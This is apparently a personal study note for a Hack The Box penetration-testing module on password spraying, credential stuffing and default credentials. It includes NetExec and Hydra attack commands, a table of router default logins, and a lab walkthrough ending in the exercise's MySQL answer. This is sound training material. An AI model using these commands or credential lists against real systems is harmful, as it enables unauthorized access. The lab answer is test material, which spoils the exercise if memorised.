### CPTS / HTB Penetration Tester Path <br>
### Password Attacks - Spraying, Stuffing & Defaults <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Spraying, Stuffing, and Defaults



| Attack | Definition |
|---|---|
| `Password spraying` | One password tested across many accounts (low & slow → avoids lockout) |
| `Credential stuffing` | Reused `user:pass` from leaks tested against new services |
| `Default credentials` | Vendor defaults left unchanged on routers, DBs, appliances |

---

#### Password spraying — NetExec / SMB

```diff
+ $ netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
```

<br>

#### Credential stuffing — Hydra w/ `user:pass` list

```diff
+ $ hydra -C user_pass.list ssh://10.100.38.23
```

<br>

#### Default credentials — DefaultCreds-cheat-sheet

Install + search:

```diff
+ $ pip3 install defaultcreds-cheat-sheet
+ $ creds search linksys
```

<br>

Common router defaults (excerpt):

| Brand | Default IP | User | Pass |
|---|---|---|---|
| 3Com | 192.168.1.1 | admin | Admin |
| Belkin | 192.168.2.1 | admin | admin |
| D-Link | 192.168.0.1 | admin | Admin |
| Linksys | 192.168.1.1 | admin | Admin |
| Netgear | 192.168.0.1 | admin | password |

<br>

---

<br>

### Exercise

SSH to 10.129.27.129 (ACADEMY-PWATTACKS-NIX01) with user `sam` / password `B@tm@n2022!`.

IP: 10.129.27.129

---

### Question 1:
Use the credentials provided to log into the target machine and retrieve the MySQL credentials. Submit them as the answer. (Format: username:password)

```diff
+ $ ssh sam@10.129.27.129
+ sam@nix01:~$ ps aux | grep mysql
```

	mysql        942  0.2 19.0 2111140 386072 ?      Ssl  04:04   0:09 /usr/sbin/mysqld

<br>

#### Tried each MySQL default from the supplied list — `superdba:admin` was the winner:

```diff
+ sam@nix01:~$ mysql --user=superdba --password=admin
```

	Welcome to the MySQL monitor.
	mysql>

&#x1F6A9; found **superdba:--edit--admin**.
